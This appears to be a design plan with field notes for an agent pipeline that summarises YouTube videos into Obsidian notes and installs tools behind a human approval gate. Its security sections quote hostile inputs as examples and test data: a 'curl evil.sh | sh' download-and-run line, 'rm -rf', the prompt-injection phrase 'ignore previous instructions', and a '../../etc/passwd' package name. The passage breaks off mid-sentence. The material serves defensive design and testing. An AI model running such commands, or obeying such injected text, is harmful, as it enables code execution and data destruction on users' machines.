# Self-Learning Agent — Plan

**Status:** design, pre-implementation
**Last updated:** 2026-09-06
**Owner:** @sohamchoulwar

---

## 1. Problem

Creators like [Greg Isenberg](http://youtube.com/@GregIsenberg) publish a high volume of
videos about building with AI agents — which tools to use, which MCP servers, which
prompting patterns. The information is genuinely useful but arrives faster than a
human can absorb, remember, and *set up*. By the time you need a technique, you've
forgotten which video it was in and how to configure it.

## 2. Goal

A pipeline where the coding agent watches a source (a video, a channel, later any
document), writes a durable note into an Obsidian vault explaining what it teaches
and what to use, and then — behind an explicit human gate — installs and configures
the things worth having.

Open source, MIT, installable by anyone as a Claude Code plugin.

## 3. Non-goals (v1)

- Not a general video summarizer. The output is *actionable setup*, not a recap.
- Not a replacement for watching videos you enjoy watching.
- No vision-on-frames (see Known Limitations).
- No hosted service, no multi-user, no auth.

---

## 4. Locked decisions

| # | Decision | Choice | Why |
|---|---|---|---|
| D1 | What the pipeline *does* after the doc | **Generates skills AND installs real tools** | Full automation is the point; guarded by the gate in §8 |
| D2 | Trigger model | **Manual `/learn-from` first, cron later** | Prove the pipeline end-to-end where you can watch it work |
| D3 | Project shape | **Python core + Claude Code plugin** | Deterministic work is tested Python; synthesis is the agent. Frontend later calls the Python layer |
| D4 | Note destination | **New dedicated vault** (`/mnt/d/LearningVault`) | Keeps machine-generated notes out of human notes; clean OSS default; safe to wipe while tuning |
| D5 | Transcript source | **`yt-dlp`, anonymous** | Channel listings *and* captions with no API key. YouTube Data API stays optional |
| D6 | Output shape | **Classified: tooling vs. conceptual** | A setup video and an ideas video deserve different notes. See §7.1 |
| D7 | How generated skills reach Claude Code | **Copy on apply** (symlink opt-in) | Works identically on every OS; symlinks across WSL/Windows/macOS need per-platform setup. See §8 Rule 6 |

### Accepted improvements (agreed 2026-09-06)

| # | Improvement | Rationale |
|---|---|---|
| I1 | Feed **description + chapters + pinned comment**, not just the transcript | Auto-captions mangle exactly the words that matter (`MCP`→`mcp`, `n8n`→`an eight n`, `Claude Code`→`cloud code`). Descriptions are human-typed and hold the real links. Biggest accuracy win per unit of effort |
| I2 | **Cache raw fetches on disk**, keyed by video ID | Synthesis will be re-run many times while tuning prompts. Also makes tests run offline against fixtures |
| I3 | **`proposals: []` is a valid, expected output** | Most videos teach nothing installable. If the pipeline is *expected* to emit proposals it will manufacture them. This is the failure mode that makes such tools untrustworthy |
| I4 | Input is a **`Source` interface** from day one | `YouTubeSource` ships v1; `ArticleSource` / `PDFSource` become ~30-line adapters. Designing the seam now is free; retrofitting is a rewrite |

---

## 5. Architecture

Two phases separated by a human gate. Nothing outside the vault is touched before
the gate.

```
PLAN phase — no side effects outside the vault
┌───────────────────────────────────────────────────┐
│ 1. resolve     url / @handle  → video IDs          │  python
│ 2. dedupe      drop already-processed IDs          │  python (ledger)
│ 3. fetch       transcript + description + chapters │  python (yt-dlp, cached)
│ 4. inventory   installed skills / MCPs / CLIs      │  python
│ 5. synthesize  note.md + proposals.json            │  ← AGENT
│ 6. write       note into vault                     │  python
└───────────────────────────────────────────────────┘
                        ↓
              ██ HUMAN REVIEWS THE NOTE ██
                        ↓
APPLY phase — touches the machine
┌───────────────────────────────────────────────────┐
│ 7. gate        per-proposal confirm + allowlist    │  python
│ 8. apply       write skills / install / configure  │  python
│ 9. record      ledger + "Applied" note section     │  python
└───────────────────────────────────────────────────┘
```

### Why step 4 exists

Before synthesis, the pipeline hands the agent an inventory of already-installed
skills, MCP servers, and CLIs. The note therefore reads:

> *"Video recommends Playwright MCP — **you already have it**. The new part is his
> selector-retry pattern, which is worth adding as a skill."*

instead of proposing 224 things you already own. The tool gets **sharper** the more
you already have, rather than noisier.

---

## 6. The `Source` interface (I4)

```python
@dataclass(frozen=True)
class SourceDocument:
    source_type: str          # "youtube" | "article" | "pdf"
    source_id: str            # stable dedupe key (video ID, URL hash)
    url: str | None
    title: str
    author: str | None
    published_at: datetime | None
    text: str                 # transcript or body
    text_quality: str         # "manual_captions" | "auto_captions" | "native"
    description: str | None   # human-typed; high trust (I1)
    chapters: list[Chapter]   # free structure (I1)
    links: list[Link]         # extracted from description; high trust (I1)
    raw: dict                 # provider payload, for debugging

class Source(Protocol):
    def resolve(self, ref: str) -> list[str]: ...      # ref → source_ids
    def fetch(self, source_id: str) -> SourceDocument: ...
```

v1 ships `YouTubeSource` only.

---

## 7. Output: the vault note

One note per source, Obsidian-flavored markdown with YAML frontmatter.

```markdown
---
source: youtube
source_id: <video_id>
url: <url>
channel: Greg Isenberg
title: "..."
published: 2026-09-01
processed: 2026-09-06T20:14:00Z
pipeline_version: 0.1.0
text_quality: auto_captions
class: tooling            # tooling | conceptual | mixed
class_confidence: high
status: pending-review        # → applied | dismissed | partial
tags: [youtube, greg-isenberg, claude-code, mcp]
---

# <Title>

> Thesis of the video in one paragraph — the actual argument, not the intro.

## TL;DR
3–6 bullets, each an actionable claim.

## Tools & resources mentioned
| Tool | What it's for | Already installed? | Link |
|---|---|---|---|

## Techniques & patterns
### <Pattern name>
What it is, when to use it, why it works. Verbatim quote where wording matters.

## Proposed actions
Human-readable render of proposals.json.

## Gaps & uncertainty
- Things demoed on screen that the transcript lost
- Names the ASR likely mangled, with best guess and confidence

## Project ideas
Weighted by class (§7.1). Each idea meets the bar in §7.2:
what it is / why it is interesting / stack / first step / size.

## Links from description

## Applied
Appended by the APPLY phase: what ran, when, result, how to undo.
```

`## Gaps & uncertainty` is mandatory. Making the pipeline state what it *couldn't*
see is what keeps it honest.

### 7.1 Source classification (D6)

Before synthesis, the source is classified. The classification decides **which half of
the note carries the weight** — the same pipeline, two payoffs.

| Class | What it looks like | Note emphasis |
|---|---|---|
| `tooling` | Demos a GitHub repo, an MCP server, a CLI, a Claude skill, a setup workflow | **Proposed actions** is the payload. 1–2 project ideas, brief |
| `conceptual` | Business ideas, market teardowns, interviews, trends, strategy | Proposals are usually empty — and that is correct (I3). **Project ideas** is the payload: as many as pass §7.2 — often two to five, and zero is valid |
| `mixed` | Teaches a tool *and* argues an idea | Both sections carry weight |

The classifier is the agent, not a keyword matcher, and it records its reasoning in
frontmatter (`class:` + `class_confidence:`) so a wrong call is visible and fixable.

**Flow consequence:** the approval gate only runs when proposals exist. A `conceptual`
video ends at "here is your note" — there is nothing to install, and the pipeline says
so plainly instead of inventing work.

### 7.2 Project idea quality bar

A project idea is not "build an app with n8n." Each one must carry:

- **What it is** — one sentence a person could repeat back
- **Why it is interesting** — the non-obvious part, or the thing it proves
- **Stack** — concrete, and preferring things already installed (§6 inventory)
- **First step** — the literal first command or file, so it is startable tonight
- **Size** — weekend / week / month, honestly estimated

Ideas that fail the bar are dropped rather than padded. Three real ideas beat eight
generic ones.

**And a sixth requirement, which §7.2 originally missed:** the video must be
*load-bearing* for the idea. If the same idea could be written having never watched
it, it is decoration. Say so and drop it. **Zero project ideas is a valid outcome**,
for the same reason `proposals: []` is (I3) — a target count is pressure to invent,
and inventing is the failure mode both rules exist to prevent.

Found by running a poker video through the pipeline (§19): two ideas were defensible
and a third would have been padding to reach a range the plan had asked for.

---

## 8. Security model — the gate

**Threat:** a transcript, description, or comment is untrusted input written by a
third party. Under D1 that input can influence commands that run on the machine.
A video description saying `curl evil.sh | sh` must never become an executed command.

### Rule 1 — the agent never emits a shell string

Proposals name a **package on a known registry**, never a command. The Python layer
builds the command from a template. There is no path from transcript text to `bash`.

```json
{ "kind": "package", "manager": "npm", "name": "@playwright/mcp", "version": "latest" }
```
→ python renders → `npm install -g @playwright/mcp@latest`

### Rule 2 — risk tiers

| Tier | Examples | Policy |
|---|---|---|
| `none` | Write a skill `.md` inside the project repo | Auto-apply if opted in |
| `low` | Write into `~/.claude/skills/`, add an MCP entry | Confirm, batched |
| `medium` | Install from npm / PyPI **on the allowlist** | Confirm individually, exact command shown |
| `high` | Anything off-allowlist, anything needing a secret, any `git clone`+run, any URL-sourced script | **Never automated.** Printed as manual instructions only |

### Rule 3 — allowlist

Package managers: `npm`, `npx`, `pip`, `uv`, `pipx`.
Registries: npmjs.com, PyPI. Git: `github.com` clones only, never executed after clone.
Everything else is `high` by definition.

### Rule 4 — secrets are never handled

If a proposal needs an API key, the pipeline writes the `.env` *key name* and stops.
It never reads, writes, echoes, or transmits a value.

### Rule 5 — every apply is reversible

Each proposal carries an `undo` field. The `Applied` note section records it.

### Rule 6 — generated skills are reviewable before they are live (D7)

Generated skills are written to `generated-skills/<name>/SKILL.md` **inside this repo**,
where they are ordinary tracked files. `git diff` shows exactly what the agent authored
before any of it takes effect, and `git revert` rolls back a skill built on bad advice.

Activation is a separate, explicit step:

```
generated-skills/<name>/     ──[ sla apply ]──►   ~/.claude/skills/<name>/
   (git: reviewable)              copy               (live)
```

**Default is copy, not symlink.** Symlinks across WSL / Windows / macOS need
per-platform setup and dangle when the repo moves — unacceptable for a tool other
people install. `install_mode = "symlink"` is available in config for a faster local
loop, and is documented as the advanced option.

Cost of copying: two files can drift if the live copy is hand-edited. `sla status`
diffs repo against live and reports drift, so it is visible rather than silent.

*Reviewability is a security control, not a convenience.* Under D1 the agent authors
instructions that later steer an agent with shell access. A human-readable diff before
activation is the last checkpoint on that path.

---

## 9. `proposals.json` contract

```json
{
  "schema_version": 1,
  "source_id": "<video_id>",
  "generated_at": "2026-09-06T20:14:00Z",
  "proposals": [
    {
      "id": "p1",
      "kind": "skill|mcp_server|package|repo_clone|config_edit|manual",
      "title": "Add selector-retry pattern as a skill",
      "rationale": "Why this is worth having, given what is already installed",
      "evidence": { "quote": "...", "timestamp": "12:43" },
      "risk": "none|low|medium|high",
      "already_have": false,
      "action": { "type": "write_file", "path": "...", "content_ref": "artifacts/p1-SKILL.md" },
      "requires_secret": [],
      "reversible": true,
      "undo": "rm -rf ~/.claude/skills/selector-retry"
    }
  ]
}
```

Validated with a JSON Schema / pydantic model before the gate ever sees it.
Invalid proposal → dropped, logged, surfaced in the note. **Never** silently applied.

---

## 10. Repo layout

```
self-learning-agent/
├── README.md  PLAN.md  LICENSE (MIT)  pyproject.toml
├── .claude-plugin/plugin.json        # installable as a Claude Code plugin
├── commands/learn-from.md            # /learn-from <url|@handle>
├── skills/learn-from-source/SKILL.md # synthesis instructions for the agent
├── generated-skills/                 # agent-authored skills, in git, pre-activation (D7)
├── src/self_learning_agent/
│   ├── sources/{base,youtube}.py
│   ├── cache.py       # I2 — raw fetch cache
│   ├── ledger.py      # processed source_ids (sqlite)
│   ├── inventory.py   # installed skills / MCPs / CLIs
│   ├── vault.py       # note render + write
│   ├── proposals.py   # schema + validation
│   ├── gate.py        # risk policy + allowlist
│   ├── apply.py       # executes approved proposals; copies skills live (D7)
│   ├── config.py      # ~/.self-learning-agent/config.toml
│   └── cli.py         # sla fetch | inventory | apply | status (incl. drift check)
└── tests/  (+ fixtures/ for offline transcript tests)
```

---

## 11. Milestones

| M | Deliverable | Done when |
|---|---|---|
| M0 | ✅ Repo skeleton, config, CI, MIT license | `pytest` runs green on an empty suite |
| M1 | ✅ `sla fetch <url>` → cached `SourceDocument` JSON | Works offline on 2nd run; ledger dedupes |
| M2 | ✅ `sla inventory` → installed skills/MCPs/CLIs | Correctly lists the 224 local skills |
| M3 | ✅ `/learn-from <url>` → note in vault + `proposals.json` | A `tooling` video yields proposals worth approving **and** a `conceptual` video yields ideas worth building |
| M4 | ✅ Gate + `sla apply` | A `medium` proposal installs; a `high` one refuses and prints instructions; a generated skill goes repo → live via copy |
| M5 | ✅ Channel triage: `sla queue @handle` + `sla digest` | Dedupes against ledger, caps per-run cost |
| M6 | Scheduled polling | Cron/daemon, digest note per run |
| M7 | Frontend | Paste a link → same Python entrypoint |

v1 = **M0–M4.**

---

## 12. Testing

Per repo standards (80% minimum, TDD):

- **Unit:** proposal validation, risk classification, allowlist, note rendering, ledger dedupe, chapter parsing.
- **Classification:** fixture set of known `tooling` / `conceptual` videos; a misclassification is a real bug, not a style issue.
- **Security (highest value):** adversarial fixture transcripts containing injection attempts (`curl | sh`, `rm -rf`, "ignore previous instructions") must classify `high` and never execute. This suite is the one that must never go red.
- **Integration:** fixture video → full PLAN phase → assert note structure.
- **Never mutate global interpreter state in a test.** Patching `os.name` to check
  platform-specific output changes how `pathlib` builds every Path in the process; on
  Python ≤3.12 that makes `Path()` raise for the rest of the run, including inside
  pytest's own error reporting, so a small test bug surfaces as an INTERNALERROR with
  no usable output. Pass the platform in as a parameter instead. Local runs on 3.14
  hid this entirely — verify across the matrix, not just the dev interpreter.
- **Install mode:** copy activates correctly; drift between repo and live copy is detected and reported, never silently overwritten.
- **E2E:** one live network test, marked, off by default in CI.

---

## 13. Known limitations (document in README)

1. **Screen content is lost.** Videos demo things visually while the audio says
   "paste this in here." Description links mitigate; frame sampling + vision is
   deferred as too expensive for v1.
2. **ASR mangles product names.** Mitigated by I1, not solved. The note flags
   low-confidence names rather than hiding the problem.
3. **No paywalled/members-only content.**
4. **Recommendation quality is bounded by the creator.** The pipeline faithfully
   relays what a video says; it does not independently verify that the advice is good.

---

## 14. Open questions

- [ ] Exact vault path and folder structure inside `/mnt/d/LearningVault`
- [x] ~~Do generated skills go to `~/.claude/skills/` or a repo folder that is symlinked?~~ → **D7: copy on apply**, symlink opt-in
- [x] ~~Verify Claude Code skill discovery follows symlinks~~ → **yes**, proven in M2 (§16)
- [ ] Per-run token/cost cap for batch mode (M5)
- [ ] Whether `none`-risk auto-apply is opt-in or always-confirm

---

## 15. Field notes from M1 (2026-09-06)

First real fetch: `9_SZFIW7tus` — *"5 GitHub Repos: Kill AI Slop, Go Viral, Make Money"*,
Greg Isenberg, 24.7 min. Kept as the primary test fixture.

### What the data actually looks like

| Signal | Result |
|---|---|
| Manual captions | none |
| Auto captions | present, **4,150 words of clean punctuated prose** |
| Chapters | 7, each naming a repo |
| Description | 4,761 chars — all 5 repo URLs, timestamps, *and* the creator's own prose summaries |

### The I1 hypothesis was right, for a sharper reason than stated

The original worry was that auto-captions would be broadly unusable. They are not —
the prose is good. **Proper nouns are what break:**

| Captioned as | Actually is |
|---|---|
| "Skill Specter" | `NVIDIA/SkillSpector` |
| "Cloud Code" | Claude Code |

Both are exactly the tokens needed to find a repo. Searching GitHub for
"Skill Specter" returns nothing. The description holds
`https://github.com/NVIDIA/SkillSpector` verbatim.

**Revised rule, now load-bearing:**

> The **description is authoritative for entity names.**
> The **transcript is authoritative for reasoning about them** — why a repo matters,
> when to use it, what the caveat is. Neither substitutes for the other.

### Consequence for M3 (synthesis)

Synthesis must perform **entity reconciliation**, not naive extraction: take candidate
names from the description's links, then match transcript discussion to them by
position (chapters give the alignment) rather than by string match. A tool named only
in speech and never linked is **low confidence by construction** and belongs under
`## Gaps & uncertainty`, never in a proposal.

`Link.repo_slug` preserves original URL casing for this reason, and it is regression-tested.

### Environment notes

- `yt-dlp` warns that **Python 3.10 support is deprecated**. Dev machine is 3.10.12;
  CI covers 3.10–3.12. Worth moving to 3.11+ before it becomes forced.
- Raw metadata is ~660KB, almost all format listings. `_fetch_metadata` keeps ~15
  fields, which is what makes fixtures small enough to commit (6KB).

---

## 16. Field notes from M2 (2026-09-07)

Inventory run against the real machine: **223 user skills, 33 plugin skills, 28 MCP
servers.** Two bugs surfaced only because it was pointed at a real setup rather than
a fixture.

### `Path.rglob` silently hides symlinked skills

32 of 224 skill directories are symlinks (`brainstorming -> ../../.agents/skills/brainstorming`).
`Path.rglob` does not descend into symlinked directories, so the first implementation
found **191 of 223** and reported no error — the worst kind of bug, since a skill you
own but that inventory cannot see becomes a redundant proposal.

Fixed with `os.walk(followlinks=True)` plus a realpath-visited set, because following
links makes cycles possible. Both paths are regression-tested.

**This resolves an open question from §14:** Claude Code evidently *does* follow
symlinks for skill discovery, since those 32 skills load correctly. `install_mode =
"symlink"` (D7) is therefore viable. Copy remains the default for cross-platform
portability, not because symlinks are unproven.

### Jaccard was the wrong similarity metric

`similar_skills` initially scored `|A∩B| / |A∪B|`, which punishes a skill for having a
longer description than the query. Nothing ever crossed the threshold. Changed to
containment (`|A∩B| / |A|`) with IDF weighting, so rare words carry the signal and
generic vocabulary does not float unrelated skills up.

**Honest limit:** even weighted, keyword overlap over one-line descriptions is weak. It
puts `security-scan` at the top for a SkillSpector-style pitch, but also surfaces noise.
Real semantic matching needs embeddings — a dependency and a model call.

So the contract is deliberate:

| Check | Reliability | Use |
|---|---|---|
| `has_skill` / `has_mcp` / `has_cli` | exact | authoritative "you already have this" |
| `similar_skills` | weak | **shortlist only** — narrows 256 to ~3 for the agent to judge |

Tuning the fuzzy matcher further is polishing the wrong layer; judgment belongs to
synthesis, which reads the shortlisted descriptions.

---

## 17. Field notes from M3 (2026-09-07)

Synthesis shipped and run end to end on the fixture video. The note it produced is
one worth keeping, which was M3's stated done-condition.

### The seam that makes Rule 1 structural

`sla brief` emits data; the agent returns JSON; `sla note` validates and renders.
The agent has no file-writing and no command-producing capability in this path at
all — so §8 Rule 1 is enforced by the shape of the interface rather than by the
agent's good behaviour.

Two properties fell out of that:

- **Claimed risk is discarded.** `derive_risk()` recomputes the tier from the kind
  and action. A proposal asserting `"risk": "none"` on an npm install still comes
  out `medium`. Regression-tested.
- **Invalid proposals are dropped and surfaced**, never repaired. Silently fixing a
  malformed proposal would mean guessing at intent on untrusted input.

### A real vulnerability the adversarial suite caught

`../../etc/passwd` passed package-name validation. Every character in it is legal in
a genuine package name (`lodash.merge`, `@scope/name`), so the charset regex accepted
it — and `npm install -g ../../etc/passwd` installs from a local path.

Fixed with a **shape** check rather than a charset one: reject `..`, reject leading
`/ . ~`, and allow at most one `/` and only for an `@scope`. Both the attacks and the
legitimate names are regression-tested.

This is the argument for §12's adversarial suite in miniature: the bug was invisible
to inspection and obvious to a test.

### Restrictive by design, and it shows

Real-world install instructions frequently fall outside the allowlist. In the fixture
video, two of five repos did:

| Repo | Documented install | Tier |
|---|---|---|
| NVIDIA/SkillSpector | `uv tool install git+https://...` | `high` — a git URL is clone-and-execute, not a registry install |
| petergyang/no-ai-slop | `npx skills add <github url>` | `high` — `npx` is not an allowlisted manager |

Both render as manual instructions with the exact command printed. That is the
intended behaviour, not a gap: automating a git-URL install would defeat the
allowlist. Worth revisiting only with evidence that manual-tier proposals are being
ignored in practice.

### Inventory earned its place immediately

Synthesis dropped the No AI Slop proposal outright: `brand-voice` is already
installed and covers the same ground. That is one of five recommendations removed by
M2 on the very first real run.

---

## 18. Field notes from M4 (2026-09-08)

The approval gate ships, with SkillSpector wired in as a pre-activation scan. v1 is
complete.

### Two independent inputs, either of which can refuse

| Input | Derived from | Source |
|---|---|---|
| risk tier | what the action *does* | `proposals.derive_risk` |
| scan verdict | what the content *contains* | SkillSpector |

Neither can grant permission. Only the user does — `summarise()` reports
`auto_allowed: 0` by construction, and a test asserts nothing is ever auto-applied.

### The design error M4 exposed: scanning gates activation, not download

The first version blocked any proposal whose scan said `DO_NOT_INSTALL`. Run against
the fixture video, it blocked `browser-use/video-use` at **100/100 CRITICAL, 57
findings** — and the findings did not mean what the score implied:

| Finding | Reality |
|---|---|
| `HIGH PE3` at `.gitignore:2` | a `.gitignore` listing credential filenames |
| `MEDIUM AST4` × 17 | a video tool shelling out to ffmpeg |
| `HIGH AE1` | "artifact not completely inspected" — a scan limit, not a defect |

SkillSpector is built to scan **skills**. Pointed at a full application repo it scores
CRITICAL off false positives. A gate that blocks on that gets switched off, and a
disabled gate protects nothing.

The correction is a real distinction, not a threshold tweak:

> A scan may **block** only where applying the proposal puts content in front of an
> agent. Activating a skill does that. Cloning into staging does not — nothing
> executes, and staging exists so the thing can be read.

Blocking the clone would have prevented the review the clone is for. `SCAN_CAN_BLOCK`
is therefore `{"skill"}`; for a clone the verdict is loud but advisory.

### Observed SkillSpector behaviour worth recording

- **Static-only scans never return `SAFE`.** v2.11.1 returns `CAUTION` at score 0 with
  zero findings; the documented `LOW → SAFE` mapping applies only once semantic
  analysis has run. `CAUTION` is therefore the ordinary outcome, not an alarm.
- **`llm_available` does not mean the LLM ran.** With `--no-llm`, `llm_requested` is
  false while `llm_available` stays true. `llm_ran` requires both; `degraded` means
  semantic analysis was asked for and did not happen, and a low score then means "the
  static checks found nothing", never "this is safe".
- **Symlinked input is refused outright.** 32 skills here are symlinks, so `_resolve()`
  follows them before scanning.
- **MCP servers and registry packages cannot be scanned at all** — SkillSpector takes
  directories, files, git URLs and zips. Blocking them would make the feature unusable;
  they are confirmed with the gap stated in the reasons.

### Fail-closed points

- A missing `recommendation` parses as `DO_NOT_INSTALL`, never as safe.
- A scan that errors blocks; a scanner that is absent blocks anything scannable.
- Proposals are **re-validated when loaded from disk**, not trusted because they were
  written by an earlier run.

---

## 19. Field notes: out-of-domain source (2026-09-08)

Ran `gPPT4WpVRZ4` — *"How to beat low stakes poker! (Every Strategy)"*, 46.8 min,
9,758 words — deliberately chosen as a source the design was not built for. It is now
the `conceptual` fixture the plan had been missing.

Everything the design leans on was absent at once:

| Normally relied on | Here |
|---|---|
| Chapters, for entity alignment | **none** — single-block fallback |
| Description links, authoritative for names (I1) | **none** — three links to the creator's paid courses |
| Named tools to dedupe against inventory | **none** |

All three fallbacks held. `class: conceptual`, `proposals: []`, `status: no-actions`,
and the tools table correctly omitted itself.

### ASR breaks the same way in every domain

Card notation degrades exactly as product names do: `ace3` is A-3, `ace deuce` is A-2,
`king n` is king-nine, `108` is ten-eight, `98` is nine-eight. The failure class is
identical to `SkillSpector` → "Skill Specter" — **but with no description to correct
against**, hand examples had to be reconstructed from context and are flagged as
possibly wrong.

Generalised: I1 is not a YouTube-specific trick. **ASR is unreliable for any notation
the domain treats as precise.** Where no authoritative text exists, the note must say
the details are reconstructed rather than quietly present them as transcribed.

### The rule this run changed

§7.1 asked for "3-5" project ideas on conceptual sources. Two were genuinely defensible
here; a third would have been decoration. Nothing in the system prevented padding — I3
guards proposals, and the same pressure simply reappeared one section down.

§7.2 now requires the video to be **load-bearing** for an idea, and states that zero
ideas is valid. A target count is an instruction to invent.

---

## 20. Field notes: the load-bearing rule under test (2026-09-09)

Ran `UpE5yuhwXXc` — StarTalk, *"Neil deGrasse Tyson Explains How the Periodic Table
Works"*, 18.9 min, 3,486 words, 5 chapters — through the installed `/learn-from`
command rather than through hand-run CLI steps. First end-to-end run of the plugin.

### §7.2 refused ideas it would previously have written

§7.1 asks for 3-5 project ideas on a conceptual source. One survived.

| Candidate | Verdict |
|---|---|
| Chemistry tutor over an LLM | **dropped** — writable without watching |
| Periodic-table visualiser | **dropped** — writable without watching |
| Rediscover the groups from behaviour alone | **kept** — the video's thesis *is* the premise |

The kept idea works because the video develops a specific claim: elements were grouped
by observed behaviour and the chart stayed predictive for roughly fifty years before
electron configuration explained it. That makes the history an answer key for whether
clustering on measured properties alone recovers the columns. Without the video there
is no reason to frame the exercise that way.

The rule added in §19 was written the day before and immediately changed an output.
Recording it because the counterfactual is the point: the earlier prompt would have
produced three ideas, two of them padding.

### Verification with no authoritative text

The description held a book link, merch and social accounts — no reference material at
all. ASR could plausibly have mangled the chemists' names, and misattributing a
discovery would have been invention rather than error.

Substitute check: count how often the audio actually says each name. Mendeleev 3,
Lavoisier 8, Rutherford 1 — all safe to attribute. Bohr and Dalton appear zero times
and are therefore absent from the note, despite both being obvious things to mention
about the periodic table.

**Generalised rule:** where no authoritative text exists, mention-frequency in the
transcript is the fallback evidence, and anything the source never says stays out of
the note however plausible it looks. Plausibility is exactly how invention gets in.

### The three fixtures now cover the design's range

| Source | Class | Chapters | Authoritative links | Proposals |
|---|---|---|---|---|
| Greg Isenberg, 5 GitHub repos | `tooling` | 7 | 5 GitHub URLs | 3 |
| BlackRain79, poker strategy | `conceptual` | none | none | 0 |
| StarTalk, periodic table | `conceptual` | 5 | none | 0 |

Both branches, both chapter paths, and both link conditions are now exercised on real
content.

---

## 21. Field notes: a verdict that depended on the filesystem (2026-09-14)

The first non-dry run of `sla apply` — every prompt answered "no", so nothing was
applied — showed the same skill scanning differently depending on where it was written.
`scan-before-install` scored **0/100** in a dry run and **9/100 with LP3** in a real run,
from byte-identical content.

Five controlled scans ruled out the obvious suspects one at a time: the path, a
`Self-Learning-Agent` substring in it, the tempdir API, directory permissions, the
directory name, and timing. The discriminator was `write_text` versus `shutil.copy` on
identical bytes — metadata, not content. Flipping only the executable bit settled it:

| Scanned copy | Mode | SkillSpector `executable` | Score |
|---|---|---|---|
| written fresh in `/tmp` | 0644 | false | 0 |
| same file after `chmod +x` | 0755 | true | 9 (LP3) |
| staged in the repo on `/mnt/d` | 0777 | true | 9 (LP3) |
| same file after `chmod -x` | 0644 | false | 0 |

**Cause.** `/mnt/d` is DrvFs mounted without `metadata`: every file reports `0777` and
`chmod` is silently discarded. SkillSpector classifies files partly by mode
(`is_executable_content(path, data, mode)`), and its least-privilege analyzer skips
docs-only skills as not applicable. An executable `SKILL.md` therefore turns markdown
into "code" and switches on rules the skill is exempt from.

**Consequences, both now fixed.**

1. A verdict depended on where the checkout lives — 9 on a Windows drive under WSL, 0
   on native Linux or macOS, for the same skill.
2. `--dry-run` disagreed with a real run, **in the unsafe direction**: the dry run was
   the more lenient. The earlier `9/100, MEDIUM LP3` figures for `p1` in §17–§18 were
   this artifact, not a property of the skill.

The same session found that `--dry-run` also wrote into `generated-skills/` before it
checked the flag.

**Fix.** Mode cannot be normalised inside a DrvFs checkout, so it is fixed at both
boundaries instead:

- Every run, dry or real, scans a scratch copy written with mode `0644`. A real run still
  writes the repo copy for review (D7), but its mode is never what gets scanned.
- Activation writes the scanned content with `0644` rather than copying files, so `0777`
  never reaches `~/.claude/skills`.
- Activation refuses if the staged copy changed after the scan, is missing, or has
  anything besides `SKILL.md` beside it. Before this, content edited during the prompt
  — or an `install.sh` dropped next to the skill — would have activated unscanned.

**Rule:** a scan target must be something we wrote, with deterministic content *and*
metadata. Never scan a file whose attributes came from the environment, and never
activate anything other than what the scanner saw.

**Process note.** The five stale `/learn` references fixed alongside this survived a
week because the earlier rename used `str.replace`, which does nothing when the text
has drifted. Edits to docs and code now go through an exact-match helper that fails
when a target is not found exactly once.

---

## 22. Field notes: M5, built in parallel (2026-09-18)

M5 and a test-hardening pass were built at the same time by two agents, each in its own
git worktree on its own branch, then merged. **Zero conflicts, 278 tests on first merge.**

What made that work was choosing the second task for *disjoint files* and writing the
ownership into each brief. The M5 agent could add to `youtube.py` but not change anything
the test agent was testing; neither could touch `conftest.py`, existing tests or docs.
Docs were left for one pass after both merges, since that is where two branches would
otherwise collide. Both worktrees lived on the Linux filesystem rather than `D:` — the
suite ran in 0.26s there against 3.3s on the DrvFs mount.

**Found, not fixed.** The test agent hit a real bug and marked it
`xfail(strict=True)` instead of changing `src/`: `_run` kept the *first* 400 characters of
stderr, but yt-dlp prints its `ERROR:` line last, after notices such as the Python 3.10
deprecation — so a failed fetch reported the deprecation rather than the cause. Fixed on
main after both merges. Strictness is what made that safe: the fix turns the xfail into an
unexpected pass, which fails the run until the marker is removed, so the two cannot drift
apart.

### Triage

- `sla queue` reads metadata only; a test asserts captions are never fetched.
- The ledger is read through a read-only SQLite URI, because opening it normally creates
  it. Verified against the real ledger: the already-processed video was filtered out and
  the ledger file's mtime did not change.
- The class guess is weak at the margin. *"GPT-6 Astra: How I'd Make Money With It"*
  guessed `tooling` from two tool words in its description. It is labelled a guess
  everywhere, and the owner picks.

### The first real approval found three bugs

Approving `p1` — the first `y` ever given to the gate — worked. The skill installed with
mode 0644 from a 0777 source, byte-identical to what was scanned, and Claude Code listed it
immediately. It also exposed:

| Bug | Cause | Fix |
|---|---|---|
| The prompt crashed under Claude Code's `!` | `input()` raised `EOFError` | End of input is "no" for everything left, with instructions |
| The ledger lost the video's title | A status update upserted `title = NULL` | Fields not supplied keep their stored value |
| The video showed `applied` with `p2` never seen | Status considered only proposals attempted in that run | The store remembers applied ids; `applied` only when nothing automatable waits; applied proposals are not re-offered |

The real ledger was backed up, then repaired: title restored, status `partial`.

### Another silent `str.replace`

§19 meant to remove the "3–5 project ideas" quota from §7.1. It searched for `3-5` with a
hyphen; the file has an en-dash, so nothing changed — and the skill's step 2 still said
"give 3–5". Both were live instructions to pad for a week after the rule saying zero is
valid, the exact failure §19 was written to prevent. Now fixed with the exact-match helper.

The lesson generalises Rule 9: an edit made with a silent replace is unverified, *including
the old ones*. Grep for the intended result, not just for the absence of an error.


---

## 23. Field notes: the first real channel run (2026-09-24)

`/learn-from @GregIsenberg`, the first use of M5 against a live channel. Triage behaved
exactly as designed: 10 latest resolved, the 1 already processed filtered out, 9 offered,
no transcripts downloaded, and the owner picked 2 of the 5 suggestions. Then **neither
pick produced a note**, for a reason that justified the whole exercise.

### A failure that looked like an absence

The first brief reported `text_quality: none`, 0 words, and every chapter empty — that is,
"this video has no captions". The metadata said `auto_en=True`, and YouTube did list
automatic captions. The truth was `HTTP Error 429: Too Many Requests`.

| Defect | Effect |
|---|---|
| `_fetch_captions` returned `{}` whenever no subtitle file appeared | a failed download was indistinguishable from a video that has none |
| `fetch()` cached that `{}` | a transient rate-limit became permanent — every later run read the absence back out of the cache |
| yt-dlp prints `ERROR` and still exits 0 here | checking the return code saw success |

Left alone this produces a confident note written from the description alone, with nothing
marking the transcript as missing. That is precisely the outcome §15 exists to prevent, and
the note would have looked fine.

Fixed: `_run` can return stderr; `_fetch_captions` raises when metadata says captions exist
but none arrived, quoting yt-dlp's own error; nothing is cached on that path, so a retry
after the limit clears just works. The poisoned cache entry was deleted. Verified live.

### The brief specified the bug

Two tests asserted the old behaviour — and they were right to, given their instructions.
The §22 brief listed, as a deliverable: *"`_fetch_captions`: no captions → `{}`; … yt-dlp
failure → `{}`"*. The agent implemented the brief faithfully. The test that should have
caught the defect **froze it instead**.

> **Rule:** a brief states what must be *true*, never what a function should return on
> failure. Where an error path matters, say what must never happen — "a failure must never
> be cached, and must never look like an absence" — and leave the mechanism to the
